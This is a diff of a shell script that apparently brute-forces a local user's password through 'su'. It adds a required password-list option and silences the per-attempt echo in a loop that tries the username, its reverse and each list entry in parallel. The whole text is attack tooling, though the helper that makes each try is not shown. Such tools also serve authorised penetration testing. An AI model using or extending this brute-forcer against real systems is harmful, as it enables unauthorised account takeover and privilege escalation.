@@ -13,7 +13,7 @@ USER=""
 PLIST=""
 TIMEOUTPROC="0.7"
 SLEEPPROC="0.007"
-while getopts "h?u:t:s:" opt; do
+while getopts "h?u:t:s:l:" opt; do
   case "$opt" in
     h|\?) printf "$help"; exit 0;;
     u)  USER=$OPTARG;;
@@ -24,6 +24,7 @@ while getopts "h?u:t:s:" opt; do
 done
 
 if ! [ "$USER" ]; then printf "$help"; exit 0; fi
+if ! [ "$PLIST" ]; then printf "$help"; exit 0; fi
 
 C=$(printf '\033')
 
@@ -44,10 +45,10 @@ su_brute_user_num (){
   su_try_pwd $USER $USER & #Try username as password
   su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     #Try reverse username as password
   while read -r line
-	  do
-	    echo trying ${line}...
-		  su_try_pwd $USER ${line} & #Try TOP TRIES of passwords (by default 2000)
-    	sleep $SLEEPPROC # To not overload the system
+  	do
+		#echo trying ${line}...
+		su_try_pwd $USER ${line} & #Try TOP TRIES of passwords (by default 2000)
+    		sleep $SLEEPPROC # To not overload the system
 	done<$PLIST
   wait
 }
